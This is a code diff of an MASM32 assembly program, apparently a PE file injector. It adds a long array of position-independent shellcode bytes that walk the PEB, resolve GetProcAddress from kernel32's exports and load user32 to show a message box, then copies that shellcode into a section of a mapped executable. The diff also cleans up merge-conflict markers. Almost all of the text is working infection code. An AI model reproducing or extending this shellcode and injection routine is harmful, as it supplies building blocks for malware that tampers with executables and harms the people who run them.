@@ -68,11 +68,22 @@ includelib C:\masm32\lib\masm32.lib
 	;mov eax, [eax]
 	;mov eax, [eax]
 	;mov eax, [eax + 0x10]
-    code			db 056h, 031h, 0C0h, 064h, 08Bh, 040h, 030h, 08Bh,
-					040h, 00Ch, 08Bh, 040h, 014h, 08Bh, 000h, 08Bh,
-					000h, 08Bh, 040h, 010h, 089h, 045h, 000h, 089h, 
-					0C3h, 003h, 05Bh, 03Ch, 08Bh, 05Bh, 078h, 003h, 
-					05Dh, 000h, 089h, 05Dh, 004h, 0
+    code	byte 033h, 0c0h, 064h, 08bh, 040h, 030h, 054h, 08bh, 0ech, 083h, 0ech, 030h, 08bh, 040h, 00ch, 08bh
+			byte 040h, 014h, 08bh, 000h, 08bh, 000h, 08bh, 040h, 010h, 089h, 045h, 000h, 08bh, 0d8h, 003h, 05bh
+			byte 03ch, 08bh, 05bh, 078h, 003h, 05dh, 000h, 089h, 05dh, 004h, 068h, 073h, 073h, 000h, 000h, 068h
+			byte 064h, 064h, 072h, 065h, 068h, 072h, 06fh, 063h, 041h, 068h, 047h, 065h, 074h, 050h, 089h, 065h
+			byte 014h, 0bfh, 00eh, 000h, 000h, 000h, 089h, 07dh, 010h, 08bh, 07eh, 014h, 089h, 07dh, 008h, 08bh
+			byte 07eh, 018h, 089h, 07dh, 00ch, 08bh, 076h, 020h, 003h, 075h, 000h, 033h, 0c9h, 0ebh, 047h, 08bh
+			byte 075h, 004h, 08bh, 076h, 020h, 003h, 075h, 000h, 08bh, 0f9h, 0c1h, 0e7h, 002h, 003h, 0f7h, 08bh
+			byte 03eh, 003h, 07dh, 000h, 056h, 08bh, 075h, 014h, 051h, 08bh, 04dh, 010h, 0fch, 0f3h, 0a6h, 059h
+			byte 075h, 023h, 08bh, 075h, 004h, 08bh, 076h, 024h, 003h, 075h, 000h, 00fh, 0b7h, 03ch, 04eh, 08bh
+			byte 075h, 004h, 08bh, 076h, 01ch, 003h, 075h, 000h, 08bh, 03ch, 0beh, 003h, 07dh, 000h, 08bh, 0c7h
+			byte 089h, 07dh, 018h, 0ebh, 006h, 041h, 03bh, 04dh, 00ch, 072h, 0b4h, 06ah, 000h, 068h, 061h, 072h
+			byte 079h, 041h, 068h, 04ch, 069h, 062h, 072h, 068h, 04ch, 06fh, 061h, 064h, 054h, 0ffh, 075h, 000h
+			byte 0ffh, 0d0h, 089h, 045h, 01ch, 068h, 06ch, 06ch, 000h, 000h, 068h, 033h, 032h, 02eh, 064h, 068h
+			byte 055h, 073h, 065h, 072h, 054h, 0ffh, 0d0h, 068h, 06fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h
+			byte 042h, 068h, 04dh, 065h, 073h, 073h, 054h, 050h, 08bh, 05dh, 018h, 0ffh, 0d3h, 089h, 045h, 020h
+			byte 06ah, 000h, 0e8h, 001h, 000h, 000h, 000h, 0cch, 0ffh, 025h, 000h, 020h, 040h, 000h, 000h, 000h, 0h
 ;
 ; Struct url
 ;
@@ -308,12 +319,8 @@ InjectSection proc lastSection:DWORD
 	mov ebx, mappedAddr
 	add edx, ebx
 	;mov DWORD PTR [edx], 41414141h
-<<<<<<< HEAD
-	invoke MemCopy, ADDR code, edx, 14h
-=======
-	invoke MemCopy, ADDR code, edx, 25h
-	
->>>>>>> a92cab1ffaab343f671c3a324d50c9911f0d0c86
+	invoke MemCopy, ADDR code, edx, 0f0h
+	;invoke MemCopy, ADDR code, edx, 25h
 	;mov DWORD ptr [edx], ebx
 	
 	
